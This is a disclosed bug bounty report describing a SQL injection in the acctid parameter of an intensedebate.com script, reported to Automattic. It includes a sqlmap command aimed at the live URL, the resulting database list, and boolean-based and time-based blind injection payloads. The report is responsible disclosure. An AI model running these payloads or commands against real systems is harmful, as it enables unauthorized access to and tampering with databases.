# SQL Injection  intensedebate.com

## Report Details
- **Report ID**: 1069561
- **URL**: https://hackerone.com/reports/1069561
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-01T06:11:37.412Z
- **Disclosed**: 2021-01-11T13:29:03.192Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
hello dear support

I have found SQL Injection on intensedebate.com
parameters injectable ?acctid=1
URL:https://www.intensedebate.com/js/importStatus.php?acctid=1

I'm used sqlmap to injection 
command 
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --dbs
{F1140562}

available databases [3]:
[*] heartbeat
[*] id_comments
[*] information_schema

Parameter: acctid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: acctid=1 AND 1726=1726

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## Attachments
- egerg.PNG
